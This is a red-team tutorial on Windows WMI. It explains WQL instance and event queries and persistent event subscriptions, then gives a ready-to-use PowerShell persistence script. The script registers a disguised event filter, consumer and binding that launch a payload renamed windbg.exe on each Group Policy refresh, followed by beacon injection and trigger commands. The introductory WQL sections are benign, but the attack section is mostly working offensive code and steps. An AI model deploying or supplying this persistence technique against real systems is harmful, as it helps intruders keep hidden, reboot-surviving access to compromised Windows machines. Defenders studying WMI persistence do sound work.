## 1. Overview
- WMI is Microsoft's implementation of WBEM (Web-Based Enterprise Management) and CIM (Common Information Model) standards.
- It provides a common way to manage and query Windows components, including:
    - Running processes
    - Registry keys
    - Installed services
    - Files and other system information
    
- WMI can be queried using WQL (WMI Query Language), a SQL-like query language.
- Red team relevance: WMI supports event-driven actions and persistent event subscriptions, which can be abused for persistence and asynchronous execution without requiring a continuously running process.
## 2. WMI Queries

There are two main types of WMI queries.
### Instance Queries
Retrieve a snapshot of current information.
Syntax:
```
SELECT [PROPERTY] FROM [CLASS_NAME] WHERE [CONDITION]
```

Example — find running Notepad processes:
```
SELECT * FROM Win32_Process
WHERE Name = 'notepad.exe'
```

- `Win32_Process` — WMI class representing processes.
- `Name` — property being filtered.
- `*` — return all properties.
- `WHERE` — restrict results to matching objects.

### Event Queries

Monitor for events that occur in the future, rather than returning only the current state.
Syntax:
```
SELECT * FROM [INTRINSIC_EVENT_CLASS]
WITHIN [POLLING_INTERVAL]
WHERE [CONDITION]
```

Example — detect when Notepad starts:

```
SELECT * FROM __InstanceCreationEvent WITHIN 5
WHERE TargetInstance ISA 'Win32_Process'
AND TargetInstance.Name = 'notepad.exe'
```


## 3. WMI Eventing

WMI eventing allows actions to be triggered when a matching event occurs.
There are two important types of event registration.
### Local Event Registration
- Does not provide persistent, reboot-surviving WMI subscriptions.
- So Ali does not care.
### Persistent Event Subscriptions
Persistent subscriptions are stored in the WMI repository and can survive reboots. They are useful for legitimate system automation but can also be abused for persistence.

Three components are required:

1. Event Filter — `__EventFilter`
2. Event Consumer
3. Filter-to-Consumer Binding — `__FilterToConsumerBinding`

# The Attack
The following code triggers an exe file when the computer updates its Group Policy Objects.

```c
function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name = "Debug Trace"
      Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage = 'WQL'
   }

   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name = "Debug Consumer"
      CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
   }

   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter = $Filter
      Consumer = $Consumer
   }

   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
```

### How to perform
1. Save the script as `C:\Tools\WmiPersistence.ps1`.
2. Upload your payload and rename it to : `windbg.exe`
3. Import your powershell code: 
```
powershell-import C:\Tools\WmiPersistence.ps1
```
4. Inject it to your current beacon
```
psinject [BEACON PID] x64 Add-WmiPersistence
```
5. To trigger the beacon 
```
execute gpupdate /target:computer /force
```
6. To remove the beacon
```
psinject [BEACON PID] x64 Remove-WmiPersistence
```


### When does Group Policy refresh?

By default, Windows refreshes Group Policy approximately:
- Domain-joined computers: every 90 minutes, with a randomized offset of up to 30 minutes.
- Domain controllers: every 5 minutes by default.
- At startup or user sign-in: applicable computer or user policies are also processed.
